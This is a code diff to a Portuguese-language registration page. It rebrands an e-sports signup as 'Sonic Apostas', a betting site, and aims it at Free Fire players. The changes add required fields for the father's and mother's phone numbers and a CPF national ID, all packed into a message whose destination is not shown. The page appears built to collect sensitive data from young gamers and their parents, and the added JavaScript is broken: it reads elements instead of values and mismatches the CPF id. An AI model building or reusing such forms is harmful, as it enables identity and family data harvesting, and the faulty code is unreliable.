@@ -2,7 +2,7 @@
 <html lang="pt-BR">
 <head>
 <meta charset="UTF-8">
-<title>Cadastro - França E-Sports</title>
+<title>Cadastro - Sonic Apostas</title>
 
 <style>
 body {
@@ -82,11 +82,23 @@ button:hover {
     </div>
 
     <div class="input-group">
-      <input type="text" id="gameid" placeholder="ID do jogo" required>
+      <input type="text" id="gameid" placeholder="ID do Free Fire" required>
     </div>
 
     <div class="input-group">
       <input type="text" id="telefone" placeholder="Número de telefone" required>
+    </div>
+
+    <div class="input-group">
+      <input type="number" id="telefoneone" placeholder="Número Do Pai" required>
+    </div>
+
+    <div class="input-group">
+      <input type="number" id="telefonetwo" placeholder="Número Da Mãe" required>
+    </div>
+
+    <div class="input-group">
+      <input type="number" id="cpf" placeholder="CPF" required>
     </div>
 
     <button type="submit">Cadastrar</button>
@@ -103,6 +115,9 @@ document.getElementById("form").addEventListener("submit", async function(e){
   const email = document.getElementById("email").value;
   const gameid = document.getElementById("gameid").value;
   const telefone = document.getElementById("telefone").value;
+  const telefoneone = document.getElementById("telefoneone")
+  const telefonetwo = document.getElementById("telefonetwo")
+  const cpf = document.getElementById("CPF")
 
   let mensagem = `
 📩 NOVO CADASTRO
@@ -112,6 +127,9 @@ document.getElementById("form").addEventListener("submit", async function(e){
 📧 Email: ${email}
 🆔 ID do jogo: ${gameid}
 📱 Telefone: ${telefone}
+📱 Telefone Do Pai: ${telefoneone}
+📱 Telefone Da Mãe: ${telefonetwo}
+🔢 CPF: ${cpf}
 `;
 
   try {
